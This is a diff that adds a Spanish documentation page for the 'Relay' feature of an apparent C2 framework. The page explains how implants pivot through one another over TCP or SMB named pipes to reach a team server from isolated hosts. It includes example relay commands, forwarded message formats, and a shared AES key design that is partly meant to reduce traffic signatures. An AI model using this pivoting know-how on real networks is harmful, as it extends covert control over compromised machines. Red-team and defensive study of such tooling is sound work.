@@ -1,0 +1,118 @@
+---
+title: Relay
+---
+
+import { Step, Steps } from 'fumadocs-ui/components/steps';
+
+Relay es una función del implant que permite que los implants se comuniquen entre sí dentro de una red. Resulta útil cuando un host no tiene acceso a internet o cuando la red está muy restringida.
+
+Los relays admiten **SMB** y **TCP**. SMB solo en Windows.
+
+## Cómo usarlo
+
+Para aclararlo, aquí va un escenario de ejemplo:
+
+Tienes el host A y, en la misma red, el host B sin salida al exterior, así que no puede llegar al team server directamente.
+
+En ese caso, sigue estos pasos:
+
+  <Steps>
+    <Step>
+      ### Implant preconfigurado
+      Primero, asegúrate de que el host B ya ejecuta un implant preconfigurado para comunicación relay.
+
+      Para saber cómo compilar un implant relay, consulta [Relay stageless implant](/docs/client/implants/creation#relay-stageless-implant)
+    </Step>
+    <Step>
+      ### Configurar el relay en el host A
+
+      Relay TCP:
+        ```
+        relay create --listen 8888 --target implant://192.168.15.10:9090 --channel tcp
+        ```
+      Relay SMB (solo Windows):
+        ```
+        relay create -l 445 --target server://192.168.15.10:9090 -c smb --pipe test --tls
+        ```
+    Parámetros:
+        - `--listen` / `-l`: puerto que abre y escucha el implant (también se usa como id de relay por defecto)
+        - `--target` / `-t`: destino downstream como `implant://host:port` o `server://host:port`
+        - `--channel` / `-c`: `tcp` o `smb`
+        - `--pipe`: named pipe de SMB. Usa un nombre corto como `test` o una ruta completa `\\pipe\\name` en Windows
+        - `--tls`: cuando el destino usa `server://`, envía POST al team server por HTTPS en lugar de HTTP
+        - `--id`: id del relay para `relay delete` o para sustituir el id por defecto del puerto de escucha
+    </Step>
+    <Step>
+      ### Gestionar relays
+      Ejecuta `relay` sin argumentos para listar relays activos (puerto de escucha, destino, modo, estado).
+
+      Detén un relay con:
+        ```
+        relay delete --id 8888
+        ```
+    </Step>
+    <Step>
+      ### Probar el relay
+      Después de eso, el implant B debería quedar plenamente operativo.
+    </Step>
+  </Steps>
+
+
+### Prefijo del target
+
+El parámetro `target` siempre lleva el prefijo `implant://` o `server://`. Eso indica al implant cuándo convertir el tráfico a HTTP para llegar al team server.
+
+Qué prefijo usar es sencillo. Si el siguiente salto es el team server, usa `server://`: ese es tu punto de salida. Si pasas tráfico a otro implant, usa `implant://`.
+
+### Retardo acumulado
+
+Los relays reenvían tráfico respetando el delay configurado en cada implant. Si el tráfico salta por varios hosts, esos retardos se suman y los tiempos de respuesta pueden volverse notablemente más lentos.
+
+## Cómo funciona
+
+Una vez creado el relay, empieza a escuchar en el puerto configurado.
+
+Cuando llega tráfico, el implant descifra el payload, añade su propio host tag a `chain`, vuelve a cifrar y lo reenvía al destino.
+
+El JSON reenviado sigue esta estructura:
+
+```json
+{
+  "source": "hostB",
+  "content": [
+    {
+      "option": "output",
+      "type": "terminal",
+      "task_tag": "k7F2a9",
+      "output": "desktop\\user\r\n"
+    }
+  ],
+  "chain": ["hostB", "hostA"]
+}
+```
+
+Cuando el destino es otro implant, el payload se reenvía tal cual. Cuando el destino es el team server, el implant convierte el tráfico a HTTP y lo envía hacia arriba.
+
+### Cifrado de la comunicación
+
+Todo el tráfico relay se cifra con una clave maestra AES incrustada en cada implant en tiempo de compilación. Todos los implants compilados para el mismo team server comparten la misma clave.
+
+Así los implants no necesitan un handshake previo solo para intercambiar claves, lo que también reduce ese tipo de firma de tráfico.
+
+Para cambiar la clave maestra AES, edita `server.conf` en la sección `[implants]` y define `relay_aes_key`. El valor debe decodificarse a al menos 32 bytes (base64 o hexadecimal). Recompila los implants después de cambiarla.
+
+**Nota:** cambiar la clave maestra AES romperá la comunicación con cualquier implant que siga usando la clave antigua.
+
+### Windows
+
+- **TCP** usa `WSAStartup`, `socket`, `bind`, `listen`, `accept`, `connect`, `send`, `recv`, `closesocket`, `getaddrinfo` y `freeaddrinfo` de `ws2_32.dll`.
+
+- **SMB** usa `CreateNamedPipeA`, `ConnectNamedPipe`, `CreateFileA`, `WaitNamedPipeA`, `PeekNamedPipe`, `ReadFile`, `WriteFile`, `DisconnectNamedPipe` y `CloseHandle` de `kernel32.dll`.
+
+### Linux
+
+Usa sockets POSIX (`sys/socket.h`) con `socket`, `bind`, `listen`, `accept`, `connect`, `send`, `recv`, `setsockopt` y `getaddrinfo` / `freeaddrinfo`. SMB no se admite.
+
+### macOS
+
+Usa `net.Listen`, `net.Accept`, `net.Dial` e `io.Copy` de la stdlib de Go. SMB no se admite.
